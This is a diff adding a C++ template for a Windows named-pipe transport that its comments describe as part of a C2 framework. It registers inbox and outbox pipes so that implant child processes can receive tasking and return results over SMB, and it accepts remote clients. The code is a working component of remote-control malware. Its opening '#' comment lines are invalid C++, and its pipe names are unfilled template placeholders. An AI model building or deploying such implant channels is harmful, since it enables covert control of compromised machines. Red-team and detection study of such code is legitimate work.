@@ -1,0 +1,101 @@
+# So all we need for protocol specific, is tentatively register pipe.
+# UNLESS, we want to control chunk size, which idrc about
+# okay, just have pipe name for now, and keep geenric SMB logic
+
+# remeber, this is added to comms list of funcs, so we are good to not loop in here
+
+#include <windows.h>
+#include <iostream>
+#include <vector>
+#include <queue>
+#include <mutex>
+#include "comms/queues.h"
+#include "_debug/debug.h"
+
+//namespace SMB_TEMPLATE_STRAT_NAME {
+namespace [[ smb_profile_namespace ]] {
+
+        //read size for adjustable read_pipe_dynamic.
+        //constexpr size_t read_size = 8192;
+        //not implenmented yet but for later
+
+        //pipe names - templated
+        //std::wstring wstr_inbox_pipe_name = L"\\\\.\\pipe\\inbox2";
+        //std::wstring wstr_outbox_pipe_name = L"\\\\.\\pipe\\outbox2";
+
+        // Pipe communication model
+        //
+        // Inbox  = inbound data from the server (tasks)
+        // Outbox = outbound data to the server (task results)
+        //
+        // Traditional HTTP C2 transports typically separate these operations
+        // using different request types:
+        //
+        //     GET  -> retrieve tasks from the server
+        //     POST -> send task results back
+        //
+        // This transport implements the same logical request/response model
+        // using two (one way) named pipes:
+        //
+        //     inbox  -> (server →) parent → child  : tasking
+        //     outbox -> child → parent (→ server)  : results
+        //
+        // Functionally this mirrors GET/POST semantics, but both directions
+        // operate within the same pipe-based transport channel instead of
+        // separate HTTP requests.
+        //
+        // The design intentionally uses two one-way pipes rather than a single
+        // bidirectional pipe. Each pipe acts as a simple producer/consumer
+        // channel, keeping read/write responsibilities separated.
+        //
+        // Why did I do it this way? Tbh it just felt simpler. Two one-way pipes map
+        // cleanly to producer/consumer, and it avoids the coordination weirdness
+        // that can happen when both sides read/write on the same pipe (potential
+        // deadlocks, etc). It also makes scaling to lots of child workers
+        // easier since the direction of communication stays obvious and the
+        // overall model is less complicated.
+    std::wstring wstr_inbox_pipe_name = L"\\\\.\\pipe\\[[ inbox_pipe_name ]]";
+    std::wstring wstr_outbox_pipe_name = L"\\\\.\\pipe\\[[ outbox_pipe_name ]]";
+
+    // Store the handles inside the namespace for this specific profile
+    inline HANDLE h_inbox_pipe = INVALID_HANDLE_VALUE;
+    inline HANDLE h_outbox_pipe = INVALID_HANDLE_VALUE;
+
+    //Template - SMB PIPE NAMES
+    inline int register_pipe() {
+        DEBUG_LOG("[ [[ smb_profile_namespace ]]::register_pipe ]: Attempting to register inbox...");
+        
+        h_inbox_pipe = CreateNamedPipeW(
+            wstr_inbox_pipe_name.c_str(),
+            PIPE_ACCESS_INBOUND,
+            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
+            1, 4096, 4096, 0, NULL
+        );
+
+        if (h_inbox_pipe == INVALID_HANDLE_VALUE) {
+            DEBUG_LOG("[-] Inbox pipe registration failed. Error: " << GetLastError());
+            return 1;
+        }
+
+        DEBUG_LOG("[ [[ smb_profile_namespace ]]::register_pipe ]: Attempting to register outbox...");
+        
+        h_outbox_pipe = CreateNamedPipeW(
+            wstr_outbox_pipe_name.c_str(),
+            PIPE_ACCESS_OUTBOUND,
+            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
+            1, 4096, 4096, 0, NULL
+        );
+
+        if (h_outbox_pipe == INVALID_HANDLE_VALUE) {
+            DEBUG_LOG("[-] Outbox pipe registration failed. Error: " << GetLastError());
+            return 1;
+        }
+
+        // Await connection for both pipes
+        // (Assuming await_client_connection is defined in your SMB::Child namespace)
+        if (!SMB::Child::await_client_connection(h_inbox_pipe, "INBOX")) return 1;
+        if (!SMB::Child::await_client_connection(h_outbox_pipe, "OUTBOX")) return 1;
+
+        return 0;
+    }
+}
